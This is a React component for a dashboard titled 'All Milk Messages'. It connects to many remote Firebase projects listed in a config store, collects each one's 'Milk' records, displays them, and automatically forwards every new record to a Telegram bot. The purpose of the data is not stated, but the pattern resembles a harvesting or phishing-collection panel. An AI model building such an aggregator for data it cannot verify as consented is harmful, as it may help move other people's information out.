import React, { useEffect, useState, useCallback, useMemo } from "react";
import { db } from "../utils/firebase";
import { ref, get } from "firebase/database";
import { initializeApp, getApps, deleteApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { sendToTelegram } from "../utils/telegram";

// Cache for storing fetched data
const messageCache = new Map();
const CACHE_DURATION = 5 * 60 * 1000; // 5 minutes

const Message = () => {
  const [allMessages, setAllMessages] = useState([]);
  const [loading, setLoading] = useState(false); // Changed initial state to false
  const [error, setError] = useState(null);
  const [currentPage, setCurrentPage] = useState(1);
  const [itemsPerPage] = useState(20);
  const [searchTerm, setSearchTerm] = useState("");

  // Optimized data fetching with caching and parallel processing
  const fetchDataFromConfig = useCallback(async (key, config) => {
    const cacheKey = `${key}-${config.databaseURL}`;
    const cached = messageCache.get(cacheKey);

    // Return cached data if still valid
    if (cached && Date.now() - cached.timestamp < CACHE_DURATION) {
      return cached.data;
    }

    if (typeof config === "string") {
      try {
        config = JSON.parse(config);
      } catch (e) {
        console.warn(`Skipping config ${key} due to JSON parse error:`, e.message);
        return [];
      }
    }

    if (!config.databaseURL) {
      console.warn(`Skipping config ${key} as no databaseURL found.`);
      return [];
    }

    const appName = `milkApp-${key}-${Date.now()}`;
    let remoteApp = null;

    try {
      remoteApp = initializeApp(config, appName);
      const remoteDb = getDatabase(remoteApp);

      // Add timeout to prevent hanging requests
      const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error('Request timeout')), 10000)
      );

      const dataPromise = get(ref(remoteDb, "Milk"));
      const milkSnapshot = await Promise.race([dataPromise, timeoutPromise]);
      const milkData = milkSnapshot.val();

      if (milkData) {
        const messages = Object.entries(milkData).map(([msgKey, msgVal]) => ({
          id: msgKey,
          ...msgVal,
          _projectId: config.projectId || key,
          _databaseURL: config.databaseURL,
        }));

        // Cache the result
        messageCache.set(cacheKey, {
          data: messages,
          timestamp: Date.now()
        });

        return messages;
      }
      return [];
    } catch (remoteErr) {
      console.warn(
        `Error fetching Milk data from ${config.databaseURL}:`,
        remoteErr.message || remoteErr
      );
      return [];
    } finally {
      if (remoteApp) {
        try {
          await deleteApp(remoteApp);
        } catch (e) {
          console.error('Error deleting app:', e);
        }
      }
    }
  }, []);

  const fetchAllMilkMessages = useCallback(async () => {
    try {
      setLoading(true); // Set loading to true when starting
      setError(null);
      
      const configsSnapshot = await get(ref(db, "firebaseConfigs"));
      const configs = configsSnapshot.val() || {};
      const configEntries = Object.entries(configs);
      let finishedCount = 0;
      let combinedMessages = [];

      // Progressive rendering: as each config loads, append results
      await Promise.all(
        configEntries.map(async ([key, config]) => {
          try {
            const messages = await fetchDataFromConfig(key, config);
            combinedMessages = combinedMessages.concat(messages);
            // Sort and update state after each config
            combinedMessages.sort((a, b) => (a.id < b.id ? 1 : -1));
            setAllMessages([...combinedMessages]);
          } catch (err) {
            console.warn(`Failed to fetch data for config ${key}:`, err);
          } finally {
            finishedCount++;
            // When all configs are done, stop loading
            if (finishedCount === configEntries.length) {
              setLoading(false); // Set loading to false only after all fetches
            }
          }
        })
      );

      // --- AUTO SEND TO TELEGRAM ---
      let telegramConfigs = [];
      try {
        telegramConfigs = JSON.parse(localStorage.getItem('telegramBotConfigs')) || [];
      } catch {}
      const activeConfig = telegramConfigs.length > 0 ? telegramConfigs[0] : null;
      if (activeConfig && activeConfig.botToken && activeConfig.chatId) {
        const sentKey = `sentToTelegram_${activeConfig.botToken}_${activeConfig.chatId}`;
        let sentIds = [];
        try {
          sentIds = JSON.parse(localStorage.getItem(sentKey)) || [];
        } catch {}
        const sentSet = new Set(sentIds);
        const unsentMessages = combinedMessages.filter(msg => !sentSet.has(msg.id));
        for (const msg of unsentMessages) {
          const text = Object.entries(msg)
            .filter(([k]) => !k.startsWith('_'))
            .map(([k, v]) => `<b>${k}</b>: ${typeof v === 'object' ? JSON.stringify(v) : String(v)}`)
            .join('\n');
          sendToTelegram({
            botToken: activeConfig.botToken,
            chatId: activeConfig.chatId,
            text
          });
          sentSet.add(msg.id);
        }
        localStorage.setItem(sentKey, JSON.stringify(Array.from(sentSet)));
      }
      // --- END AUTO SEND TO TELEGRAM ---
    } catch (err) {
      console.error("Error fetching Milk data:", err);
      setError(err);
      setLoading(false);
    }
  }, [fetchDataFromConfig]);

  useEffect(() => {
    fetchAllMilkMessages();

    return () => {
      getApps().forEach((app) => {
        if (app.name.startsWith("milkApp-")) {
          deleteApp(app).catch((e) => console.error("Error deleting temp app:", e));
        }
      });
    };
  }, [fetchAllMilkMessages]);

  // Filter and paginate data
  const filteredMessages = useMemo(() => {
    if (!searchTerm) return allMessages;
    return allMessages.filter(msg =>
      Object.values(msg).some(value =>
        String(value).toLowerCase().includes(searchTerm.toLowerCase())
      )
    );
  }, [allMessages, searchTerm]);

  const paginatedMessages = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage;
    return filteredMessages.slice(startIndex, startIndex + itemsPerPage);
  }, [filteredMessages, currentPage, itemsPerPage]);

  const totalPages = Math.ceil(filteredMessages.length / itemsPerPage);

  const handleRefresh = useCallback(() => {
    messageCache.clear();
    setCurrentPage(1);
    setSearchTerm(""); // Clear search on refresh
    setAllMessages([]); // Clear the list to show progressive loading
    fetchAllMilkMessages();
  }, [fetchAllMilkMessages]);

  return (
    <div className="min-h-screen bg-gray-100 p-8">
      <div className="max-w-5xl mx-auto bg-white p-6 rounded-lg shadow-md">
        <div className="flex justify-between items-center mb-6">
          <h2 className="text-2xl font-bold">All Milk Messages</h2>
          <button
            onClick={handleRefresh}
            className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors flex items-center gap-2"
          >
            {loading && (
              <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
            )}
            Refresh
          </button>
        </div>

        {/* Search and Stats */}
        <div className="mb-6 space-y-4">
          <div className="flex flex-col sm:flex-row gap-4 items-center">
            <input
              type="text"
              placeholder="Search messages..."
              value={searchTerm}
              onChange={(e) => {
                setSearchTerm(e.target.value);
                setCurrentPage(1); // Reset to first page on search
              }}
              className="flex-1 px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            />
            <div className="text-sm text-gray-600">
              Showing {filteredMessages.length} of {allMessages.length} messages
            </div>
          </div>
        </div>
        
        {/* New small loader for when data is still loading */}
        {loading && allMessages.length === 0 && (
          <div className="flex flex-col items-center justify-center py-12">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mb-4"></div>
            <p className="text-gray-600">Loading initial messages...</p>
          </div>
        )}

        {error && (
          <div className="flex items-center justify-center min-h-screen text-red-600">
            Error: {error.message}
          </div>
        )}

        {filteredMessages.length === 0 && !loading && (
          <p className="text-center text-gray-600">
            {allMessages.length === 0
              ? "No Milk messages found in any Firebase database."
              : "No messages match your search criteria."
            }
          </p>
        )}

        {/* This block is now always rendered */}
        {filteredMessages.length > 0 && (
          <>
            <div className="space-y-4 mb-6">
              {paginatedMessages.map((msg) => (
                <div
                  key={`${msg._projectId}-${msg.id}`}
                  className="border border-gray-300 rounded-lg p-4 bg-gray-50 shadow-sm"
                >
                  <p className="text-xs text-gray-500 mb-2">
                    <strong>Project:</strong> {msg._projectId} |{" "}
                    <strong>Database URL:</strong> {msg._databaseURL}
                  </p>

                  <p className="text-sm font-medium mb-1">Message ID: {msg.id}</p>

                  <ul className="text-sm text-gray-700 list-disc list-inside">
                    {Object.entries(msg).map(([key, value]) => {
                      if (key.startsWith("_") || key === "id") return null;
                      return (
                        <li key={key}>
                          <strong>{key}:</strong>{" "}
                          {typeof value === "object"
                            ? JSON.stringify(value)
                            : String(value)}
                        </li>
                      );
                    })}
                  </ul>
                </div>
              ))}
            </div>

            {/* Pagination */}
            {totalPages > 1 && (
              <div className="flex justify-center items-center space-x-2 mt-6">
                <button
                  onClick={() => setCurrentPage(prev => Math.max(prev - 1, 1))}
                  disabled={currentPage === 1}
                  className="px-3 py-2 border border-gray-300 rounded-lg disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-50"
                >
                  Previous
                </button>

                <div className="flex space-x-1">
                  {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
                    const pageNum = currentPage <= 3
                      ? i + 1
                      : currentPage >= totalPages - 2
                        ? totalPages - 4 + i
                        : currentPage - 2 + i;

                    if (pageNum < 1 || pageNum > totalPages) return null;

                    return (
                      <button
                        key={pageNum}
                        onClick={() => setCurrentPage(pageNum)}
                        className={`px-3 py-2 border rounded-lg ${
                          currentPage === pageNum
                            ? 'bg-blue-600 text-white border-blue-600'
                            : 'border-gray-300 hover:bg-gray-50'
                        }`}
                      >
                        {pageNum}
                      </button>
                    );
                  })}
                </div>

                <button
                  onClick={() => setCurrentPage(prev => Math.min(prev + 1, totalPages))}
                  disabled={currentPage === totalPages}
                  className="px-3 py-2 border border-gray-300 rounded-lg disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-50"
                >
                  Next
                </button>

                <span className="text-sm text-gray-600 ml-4">
                  Page {currentPage} of {totalPages}
                </span>
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
};

export default Message;